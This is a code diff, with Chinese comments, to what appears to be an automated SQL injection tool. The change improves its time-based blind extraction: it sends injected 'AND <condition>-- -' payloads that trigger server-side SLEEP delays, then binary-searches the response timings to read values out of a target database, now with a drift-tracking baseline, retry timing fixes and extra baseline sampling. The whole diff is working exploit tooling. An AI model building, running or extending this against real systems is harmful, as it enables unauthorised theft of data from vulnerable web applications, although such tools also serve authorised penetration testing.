@@ -66,6 +66,87 @@ export function resolveFetchUsing(config) {
   throw new Error(`fetchUsing 仅支持 'gt' | 'between'，收到: ${JSON.stringify(v)}`);
 }
 
+// [D53] 时间通道基线重采样间隔（每 N 个「没拿到干净 RTT 样本」的探针补采一次）。
+// 0 = 关闭漂移跟踪（退化为 D47 的「开头采一次、全程不变」口径）。
+export function resolveTimeBaselineEvery(config) {
+  const v = config?.timeBaselineEvery;
+  if (v == null) return defaults.timeBaselineEvery ?? 16;
+  // 空白串不按 0 处理：'' 会被 Number() 读成 0 从而**静默关闭**整条漂移跟踪，
+  // 这正是「传了没生效」红线最讨厌的形态（用户以为关了/没设，实际语义相反）。
+  const n = typeof v === 'string' ? (v.trim() === '' ? NaN : Number(v)) : v;
+  if (!Number.isInteger(n) || n < 0) {
+    throw new Error(`timeBaselineEvery 须为非负整数（0=关闭漂移跟踪），收到: ${JSON.stringify(v)}`);
+  }
+  return n;
+}
+
+/** 中位数（不改动入参；空数组返回 null） */
+function _median(list) {
+  if (!list.length) return null;
+  const s = list.slice().sort((a, b) => a - b);
+  return s[Math.floor(s.length / 2)];
+}
+
+// [D53] 基线漂移跟踪器：把「判假探针的耗时」当免费 RTT 样本喂进来，阈值随之实时重算。
+//
+// 为什么必须连续跟踪（而不是开头采一次就完事）：时间提取一条链动辄 60~80 个探针，
+// 目标自身耗时在这期间会漂（预热、负载爬升、下游变慢）。阈值 = 基线 + timeThresholdMs
+// 只在开头算过时，漂移一旦吃掉 timeThresholdMs 那点余量，「耗时 ≥ 阈值」对**任何**
+// 条件都成立 ⇒ 恒判真 ⇒ 实测 DRIFT=2ms/请求时提取出 "5:::::" 这种**看着像数据的错值**
+// （撞截止时间的挂死反而还是好的形态）。而整值复验失败**只标 low 置信、不重测**
+// （见下方 extractVerify 注释）⇒ 错值不会被自动纠正，会一路进报告。
+//
+// 样本从哪来（零额外请求）：判假探针的条件为假 ⇒ 服务端不执行 SLEEP ⇒ 其耗时就是
+// 当前 RTT。一次正常二分约半数探针判假，等于**免费、连续**的基线样本流。
+// 什么情况下才发额外请求：连续 every 个探针都没拿到干净样本（判真 / 请求失败）——
+// 这正是「已经恒判真」的形态 ⇒ 补采一次不注入条件的原值请求（与开头基线同款）。
+// 即：**健康提取零额外成本，只在已经出问题时才付钱**。
+//
+// ⚠ 失败探针（_send 返回 null）绝不入样：异常几乎瞬时返回，elapsed≈0 会把中位数
+//   拽下去 ⇒ 阈值被压低 ⇒ 反过来制造恒判真（与要修的故障同形）。
+function createBaselineTracker(init, everyProbes) {
+  const RING_MAX = 5;
+  // everyProbes=0 ⇒ **整条跟踪关闭**（不只是不补采）：免费样本也不许更新基线，
+  // 行为退化为 D47 的「开头采一次用到尾」。留这个开关是为了让故障能在本仓被复现
+  // （tests/extractor.timeDrift.test.js 用它证明「不跟踪就会错」），不是为了省钱。
+  const enabled = everyProbes > 0;
+  const ring = Array.isArray(init?.samples) ? init.samples.slice(-RING_MAX) : [];
+  let baselineMs = init?.baselineMs ?? 0;
+  let sinceClean = 0;
+  // ⚠ 刻意**非对称**：baseline = max(中位数, 最新样本)。
+  //   · 上行（目标变慢）立即跟随最新样本 —— 中位数要等半窗口才反应，实测滞后约
+  //     10 个探针，在 25ms 级余量上足以让漂移继续吃掉余量、修复形同虚设。
+  //   · 下行由中位数兜底 —— 单个「偶然快」的样本会把基线拽低 ⇒ 阈值被压低 ⇒
+  //     恒判真（正是要修的故障），这个方向绝不能跟着最新样本走。
+  //   往高估的唯一代价是压缩「真」侧的余量，而真侧有 sleep（1~2s）撑着，容得起；
+  //   往低估的代价是制造假阳性 —— 两个方向的风险不对称，所以估计器也不对称。
+  const recompute = () => {
+    if (!ring.length) return;
+    const med = _median(ring);
+    const newest = ring[ring.length - 1];
+    baselineMs = Math.max(med ?? 0, newest ?? 0);
+  };
+  recompute(); // 种子即开头那 3 个样本的中位数（与旧口径逐字一致）
+  return {
+    get ms() { return baselineMs; },
+    get starved() { return sinceClean; },
+    get samples() { return ring.slice(); },
+    /** 喂入一个干净 RTT 样本 */
+    observe(ms) {
+      if (!enabled) return;
+      if (!Number.isFinite(ms) || ms < 0) return;
+      ring.push(ms);
+      if (ring.length > RING_MAX) ring.shift();
+      recompute();
+      sinceClean = 0;
+    },
+    /** 本次探针没拿到干净样本（判真或请求失败） */
+    skip() { sinceClean += 1; },
+    /** 是否已欠采（需要补一次基线请求） */
+    due() { return everyProbes > 0 && sinceClean >= everyProbes; },
+  };
+}
+
   // ===== 盲注二分提取（兜底） =====
 
   // 盲注二分提取单个表达式字符串：长度二分 + 多字符并行二分（并发度 extractConcurrency）
@@ -591,8 +672,11 @@ export async function extractTime(ex, ctx, expr) {
     // 长度二分恒判真 → 顶到 blindMaxLen 上界 → 逐位置循环失控（现场见 tests/extractor.timeBaseline.test.js）。
     const absFloorMs = (ctx.config?.timeThresholdMs ?? defaults.timeThresholdMs) * 1;
     const baseTimeoutMs = ctx.config?.timeoutMs ?? defaults.timeoutMs;
-    const baselineMs = await _timeBaselineMs(ex, ctx, base, baseTimeoutMs);
-    const thresholdMs = absFloorMs + baselineMs;
+    const baselineInit = await _timeBaselineMs(ex, ctx, base, baseTimeoutMs);
+    // [D53] 基线漂移跟踪（详见 createBaselineTracker 注释）：阈值不再「开头算一次用到尾」，
+    // 而是随判假探针的免费 RTT 样本实时重算；连续欠采时才补发基线请求。
+    const tracker = createBaselineTracker(baselineInit, resolveTimeBaselineEvery(ctx.config));
+    let thresholdMs = absFloorMs + tracker.ms;
     // 完整值投票复验开关（P2-P7，与布尔通道共用 blindRobust.extractVerify，默认 true）
     const rbCfg = ctx.config?.blindRobust;
     const extractVerify = rbCfg ? rbCfg.extractVerify !== false : defaults.blindRobust.extractVerify !== false;
@@ -600,22 +684,50 @@ export async function extractTime(ex, ctx, expr) {
     // 标定判据与下面的正式判定共用同一个 thresholdMs —— 不同源的话，慢站上标定按旧阈值
     // 选中最小 sleep，而判定时阈值已抬到「基线+余量」之上，整条链会恒判假。
     const sleepSec = await calibrateTimeSleep(ex, ctx, base, condFn, thresholdMs);
-    // 注入超时同样补基线（与 StackedDetector 的 ★FIX [P0] 同因）：慢站上「基线 + sleep」超过
-    // timeout 会被掐掉 → _send 返回 null → 全部条件按失败判假 → 一次本可提取的值被误报「取不出」。
-    const timeoutMs = baseTimeoutMs + baselineMs + sleepSec * 1000;
 
     // 时间判定：条件为真 → 触发延迟 → 耗时 ≥ 阈值
     const timedTrue = async (cond) => {
+      // [D53] 阈值/超时随当前基线重算（旧实现在上面算一次，整条链共用）。
+      // 注入超时同样补基线（与 StackedDetector 的 ★FIX [P0] 同因）：慢站上「基线 + sleep」超过
+      // timeout 会被掐掉 → _send 返回 null → 全部条件按失败判假 → 一次本可提取的值被误报「取不出」。
+      thresholdMs = absFloorMs + tracker.ms;
+      const timeoutMs = baseTimeoutMs + tracker.ms + sleepSec * 1000;
+      // [D53] 欠采兜底：连续 every 个探针没拿到干净样本（恒判真 / 请求失败形态）⇒
+      // 补一次「不注入条件」的原值请求测当前 RTT，把阈值拉回真实水位。
+      if (tracker.due()) {
+        const forced = await _timeBaselineSample(ex, ctx, base, baseTimeoutMs);
+        if (forced != null) tracker.observe(forced);
+        else tracker.skip();
+        thresholdMs = absFloorMs + tracker.ms;
+      }
       const payload = `${base} AND ${condFn(cond, sleepSec)}-- -`;
-      const t0 = Date.now();
       // ★FIX-2 [P1] 原实现把「请求失败（含 axios 超时，_send 返回 null）」吞掉后仍按耗时
       // 判定：一旦请求超时，elapsed≈timeoutMs≥threshold → 恒判「条件为真」，网络抖动会
       // 污染整条时间提取链（逐字节 8 次判定全偏）。修复：失败重试一次；仍失败按
       // 「不可判定=假」处理（宁漏不误，避免错误字节）。
+      // ⚠ 计时必须**随重试重置**：只把「两次都失败」当失败是不够的——「首次超时、
+      //   重试成功」的探针会拿到 elapsed≈timeoutMs+真实 RTT 的混合值，它既不是 RTT
+      //   也不是失败，却必然 ≥ 阈值 ⇒ 被误判成「条件为真」。实测表现：长度二分多收敛
+      //   几位 ⇒ 提取出 "8036\u0000\u0000\u0000\u0000"（尾部 NUL 是越界位置的 ASCII('')）。
+      //   判据见 tests/extractor.timeDrift.test.js「请求失败的探针既不得入样、也不得参与判定」。
+      let t0 = Date.now();
       let res = await ex._send(ctx, payload, { timeoutMs });
-      if (!res) res = await ex._send(ctx, payload, { timeoutMs });
-      if (!res) return false;
-      return Date.now() - t0 >= thresholdMs;
+      if (!res) {
+        t0 = Date.now(); // 失败那次的耗时不属于本次判定，重新起算
+        res = await ex._send(ctx, payload, { timeoutMs });
+      }
+      const elapsed = Date.now() - t0;
+      if (!res) {
+        // ⚠ 失败探针的 elapsed 不是 RTT（超时已耗满 timeoutMs，瞬时异常则 elapsed≈0）
+        //   ⇒ 只记欠采，绝不入样；两个方向的污染都会把阈值推到恒判假/恒判真。
+        tracker.skip();
+        return false;
+      }
+      const hit = elapsed >= thresholdMs;
+      // 判假 ⇒ 服务端没执行 SLEEP ⇒ 这次耗时就是当前 RTT ⇒ 免费样本
+      if (hit) tracker.skip();
+      else tracker.observe(elapsed);
+      return hit;
     };
 
     // 长度二分（同 extractBoolean 的 _binarySearch，但用时间判定）
@@ -730,13 +842,18 @@ async function _verifyWholeValue(ex, ctx, base, expr, value) {
 async function _timeBaselineMs(ex, ctx, base, timeoutMs) {
     const samples = [];
     for (let i = 0; i < 3; i++) {
-      const t0 = Date.now();
-      const res = await ex._send(ctx, base, { timeoutMs, retry: 0 });
-      if (res) samples.push(Date.now() - t0);
+      const s = await _timeBaselineSample(ex, ctx, base, timeoutMs);
+      if (s != null) samples.push(s);
     }
-    if (!samples.length) return 0;
-    samples.sort((a, b) => a - b);
-    return samples[Math.floor(samples.length / 2)];
+    // [D53] 连样本一起返回：漂移跟踪器要用这 3 个样本做种子（首帧阈值与旧口径逐字一致）。
+    return { baselineMs: _median(samples) ?? 0, samples };
+  }
+
+  /** 单次基线采样：发「不注入条件」的原值请求，返回耗时（失败返回 null） */
+async function _timeBaselineSample(ex, ctx, base, timeoutMs) {
+    const t0 = Date.now();
+    const res = await ex._send(ctx, base, { timeoutMs, retry: 0 });
+    return res ? Date.now() - t0 : null;
   }
 
   // 时间盲注最小可行 sleep 标定（对标 sqlmap 时间盲注优化）：在正式二分提取前，
